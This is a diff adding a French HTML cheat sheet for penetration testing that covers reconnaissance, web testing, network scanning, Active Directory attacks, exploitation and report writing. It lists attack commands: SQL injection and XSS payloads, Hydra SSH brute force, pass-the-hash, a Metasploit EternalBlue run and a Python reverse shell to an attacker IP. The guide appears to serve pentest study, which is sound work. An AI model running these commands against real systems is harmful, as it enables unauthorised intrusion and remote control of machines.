@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Guide Reconnaissance & Exploitation</title>
+<style>
+  /* Reset basique */
+  * {
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background: #f5f7fa;
+    color: #2e3a59;
+    margin: 0;
+    padding: 30px 15px;
+    line-height: 1.65;
+    font-size: 16px;
+    max-width: 900px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+
+  h1, h2, h3 {
+    color: #1e3a8a;
+    margin-top: 2em;
+    margin-bottom: 0.6em;
+    font-weight: 700;
+  }
+
+  h1 {
+    border-bottom: 4px solid #d97706;
+    padding-bottom: 0.35em;
+    font-size: 2.4rem;
+  }
+
+  h2 {
+    font-size: 1.75rem;
+  }
+
+  h3 {
+    font-size: 1.3rem;
+    font-weight: 600;
+  }
+
+  p, ul {
+    margin-bottom: 1.3em;
+    color: #1b1b1b;
+  }
+
+  ul {
+    padding-left: 1.3em;
+  }
+
+  ul li {
+    margin-bottom: 0.5em;
+  }
+
+  pre {
+    background: #ffffff;
+    color: #d4d4dc;
+    padding: 15px 20px;
+    border-radius: 8px;
+    overflow-x: auto;
+    font-size: 0.95em;
+    box-shadow: inset 0 0 8px #d11212;
+    margin-bottom: 1.5em;
+    font-family: "Courier New", Courier, monospace;
+  }
+
+  code {
+    font-family: "Courier New", Courier, monospace;
+  
+    padding: 2px 5px;
+    border-radius: 4px;
+    font-size: 0.95em;
+    color: #1e293b;
+  }
+
+  .command {
+    background: #c0e9d6;
+    color: #064635;
+    display: inline-block;
+    padding: 4px 8px;
+    border-radius: 5px;
+    font-weight: 600;
+    font-size: 0.95em;
+    user-select: text;
+  }
+
+  .example {
+    font-style: italic;
+    color: #5a5f7a;
+    margin-top: -0.6em;
+    margin-bottom: 1.3em;
+  }
+
+  section {
+    background: #fff;
+    padding: 25px 30px;
+    margin-bottom: 40px;
+    border-radius: 12px;
+    box-shadow: 0 6px 20px rgba(30, 58, 138, 0.07);
+    transition: box-shadow 0.3s ease;
+  }
+
+  section:hover {
+    box-shadow: 0 10px 30px rgba(30, 58, 138, 0.15);
+  }
+
+  hr {
+    border: none;
+    border-top: 2px solid #444;
+    margin: 50px auto 40px;
+    max-width: 900px;
+  }
+
+  /* Boutons en bas */
+  .btn-group {
+    text-align: center;
+    margin-top: 30px;
+    margin-bottom: 40px;
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+    flex-wrap: wrap;
+  }
+
+  .btn {
+    display: inline-block;
+    font-weight: 700;
+    font-size: 1.1rem;
+    padding: 12px 28px;
+    border-radius: 10px;
+    border: 2px solid transparent;
+    cursor: pointer;
+    text-decoration: none;
+    transition: background-color 0.3s, color 0.3s, border-color 0.3s;
+    user-select: none;
+  }
+
+  .btn-windows {
+    color: #6b3b95;
+    border-color: #a669b4;
+    background-color: transparent;
+  }
+  .btn-windows:hover,
+  .btn-windows:focus {
+    background-color: #ff6f61;
+    color: #1e1e2f;
+    border-color: #ff6f61;
+    outline: none;
+  }
+
+  .btn-ad {
+    color: #2e7d32;
+    border-color: #60ad5e;
+    background-color: transparent;
+  }
+  .btn-ad:hover,
+  .btn-ad:focus {
+    background-color: #4caf50;
+    color: #1e1e2f;
+    border-color: #4caf50;
+    outline: none;
+  }
+
+  /* Responsive */
+  @media (max-width: 600px) {
+    body {
+      padding: 20px 10px;
+      font-size: 15px;
+    }
+    h1 {
+      font-size: 1.9rem;
+    }
+    h2 {
+      font-size: 1.4rem;
+    }
+    h3 {
+      font-size: 1.1rem;
+    }
+    .btn-group {
+      flex-direction: column;
+      gap: 15px;
+    }
+    .btn {
+      width: 100%;
+      text-align: center;
+    }
+  }
+</style>
+</head>
+<body>
+
+  <h1>1. Reconnaissance &amp; Énumération</h1>
+  <section>
+    <h2>But</h2>
+    <p>Trouver des informations sur la cible, comme ses adresses IP, noms de domaine, services qui tournent, sans ou avec interaction.</p>
+
+    <h3>Étape 1 : Informations publiques (recherche passive)</h3>
+    <p><span class="command">whois</span> : Donne des infos sur le propriétaire du domaine, contacts, dates, serveurs DNS.</p>
+    <pre><code>whois cible.com</code></pre>
+    <p class="example">Exemple : Si tu veux savoir qui possède "exemple.com", cette commande t’affiche tout.</p>
+
+    <p><span class="command">dig</span> : Interroge les serveurs DNS pour avoir les IP associées, mails, serveurs DNS.</p>
+    <pre><code>dig cible.com ANY</code></pre>
+    <p class="example">Cela donne tous les enregistrements DNS, comme les IP et serveurs mail.</p>
+
+    <p><span class="command">nslookup</span> : Autre outil pour trouver l’IP d’un nom de domaine.</p>
+    <pre><code>nslookup cible.com</code></pre>
+
+    <h3>Étape 2 : Scanner les ports et services (recherche active)</h3>
+    <p><span class="command">nmap</span> scan simple : scanner les 1000 ports les plus connus.</p>
+    <pre><code>nmap cible.com</code></pre>
+
+    <p>nmap scan complet : scanner tous les ports TCP (1 à 65535) sans faire de ping (utile si cible bloque ping).</p>
+    <pre><code>nmap -p- -Pn cible.com</code></pre>
+
+    <p>nmap détection version/service : savoir quel service tourne sur un port et sa version (FTP, HTTP, SSH…).</p>
+    <pre><code>nmap -sV cible.com</code></pre>
+
+    <p>nmap script vulnérabilité : scan avec scripts de vulnérabilité par défaut.</p>
+    <pre><code>nmap --script vuln cible.com</code></pre>
+
+    <h3>Étape 3 : Enumération spécifique</h3>
+    <p><span class="command">enum4linux</span> : outil pour énumérer les infos SMB/Windows (utilisateurs, groupes, partages).</p>
+    <pre><code>enum4linux -a cible_ip</code></pre>
+  </section>
+
+  <h1>2. Test d’application web</h1>
+  <section>
+    <h2>But</h2>
+    <p>Trouver des failles dans un site web.</p>
+
+    <h3>Étape 1 : Découvrir les pages et dossiers</h3>
+    <p><span class="command">dirb</span> : scanner les dossiers et fichiers cachés ou non référencés (ex: /admin, /backup).</p>
+    <pre><code>dirb http://cible.com/</code></pre>
+
+    <p><span class="command">gobuster</span> : alternative puissante pour trouver dossiers/pages.</p>
+    <pre><code>gobuster dir -u http://cible.com/ -w /chemin/wordlist.txt</code></pre>
+
+    <h3>Étape 2 : Inspecter les requêtes HTTP</h3>
+    <p>Avec <span class="command">curl</span> (pour voir les headers) :</p>
+    <pre><code>curl -I http://cible.com</code></pre>
+    <p>Intercepter les requêtes avec Burp Suite (proxy) pour analyser les données échangées.</p>
+
+    <h3>Étape 3 : Tester les vulnérabilités basiques</h3>
+    <p>Injection SQL (SQLi) : dans un paramètre GET, tester avec <span class="command"><code>' OR 1=1 --</code></span></p>
+    <p class="example">Exemple : http://cible.com/page?id=1' OR 1=1 --</p>
+
+    <p>Cross-Site Scripting (XSS) : tester si un script est exécuté.</p>
+    <p class="example">Exemple : http://cible.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
+
+    <h3>Étape 4 : Utiliser des outils automatisés</h3>
+    <p><span class="command">nikto</span> : scanner les vulnérabilités web connues.</p>
+    <pre><code>nikto -h http://cible.com</code></pre>
+
+    <p><span class="command">wpscan</span> : scanner spécifique WordPress.</p>
+    <pre><code>wpscan --url http://cible.com --enumerate u</code></pre>
+  </section>
+
+  <hr />
+  
+  <h1>3. Test de pénétration réseau</h1>
+<section>
+  <h2>But</h2>
+  <p>Scanner les ports, identifier les services, trouver des vulnérabilités réseau.</p>
+
+  <h3>Scanner tous les ports TCP avec Nmap</h3>
+  <pre><code>nmap -sS -p- &lt;IP_cible&gt;</code></pre>
+
+  <h3>Scanner avec détection de version et scripts de base</h3>
+  <pre><code>nmap -sV -sC -p- &lt;IP_cible&gt;</code></pre>
+
+  <h3>Bruteforce SSH avec Hydra (exemple)</h3>
+  <pre><code>hydra -l utilisateur -P liste_mots_de_passe.txt ssh://&lt;IP_cible&gt;</code></pre>
+
+  <h3>Scanner vulnérabilités avec OpenVAS</h3>
+  <p>Utilisation via interface web, pas de commande unique.</p>
+</section>
+
+<hr />
+
+<h1>4. Exploitation d'Active Directory</h1>
+<section>
+  <h2>But</h2>
+  <p>Énumérer les utilisateurs et groupes, identifier les admins, réaliser des attaques classiques.</p>
+
+  <h3>Énumérer les utilisateurs (PowerShell sur une machine du domaine)</h3>
+  <pre><code>Get-ADUser -Filter * -Properties *</code></pre>
+
+  <h3>Énumérer les ordinateurs</h3>
+  <pre><code>Get-ADComputer -Filter *</code></pre>
+
+  <h3>Utiliser BloodHound</h3>
+  <p>Interface graphique pour cartographier l’Active Directory.</p>
+
+  <h3>Pass-the-Hash avec Impacket (exemple)</h3>
+  <pre><code>pth-winexe -U 'DOMAIN\user%hash' //&lt;IP_cible&gt; cmd.exe</code></pre>
+
+  <h3>Capturer des hashes avec Responder</h3>
+  <p>Sur réseau local.</p>
+</section>
+
+<hr />
+
+<h1>5. Exploitation & Post-exploitation</h1>
+<section>
+  <h2>But</h2>
+  <p>Exploiter une faille, escalader les privilèges, maintenir l’accès.</p>
+
+  <h3>Exploiter EternalBlue avec Metasploit</h3>
+  <pre><code>msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS &lt;IP_cible&gt;
+run
+</code></pre>
+
+  <h3>Escalade de privilèges (exemple avec WinPEAS)</h3>
+  <pre><code>winpeas.exe</code></pre>
+
+  <h3>Reverse shell Python (Linux)</h3>
+  <pre><code>python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP_attaquant",4444));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></pre>
+</section>
+
+<hr />
+
+<h1>6. Reporting & Gestion du temps</h1>
+<section>
+  <h2>But</h2>
+  <p>Rédiger un rapport clair et organiser son travail.</p>
+
+  <h3>Structure simple du rapport</h3>
+  <ul>
+    <li>Objectifs et contexte</li>
+    <li>Méthodes utilisées</li>
+    <li>Vulnérabilités trouvées avec preuves</li>
+    <li>Recommandations</li>
+    <li>Conclusion</li>
+  </ul>
+
+  <h3>Exemple d’organisation du temps</h3>
+  <ul>
+    <li>30% reconnaissance et énumération</li>
+    <li>40% tests et exploitation</li>
+    <li>20% post-exploitation</li>
+    <li>10% rédaction</li>
+  </ul>
+</section>
+
+<hr />
+
+  <div class="btn-group">
+    <a href="Reconnaissance-Exploitation2.html" class="btn btn-windows" tabindex="0">Windows</a>
+    <a href="Reconnaissance-Exploitation3.html" class="btn btn-ad" tabindex="0">Active Directory Windows</a>
+    <a href="Reconnaissance-Exploitation4.html" class="btn btn-ad" tabindex="0">Active Directory Linux</a>
+  </div>
+
+</body>
+</html>
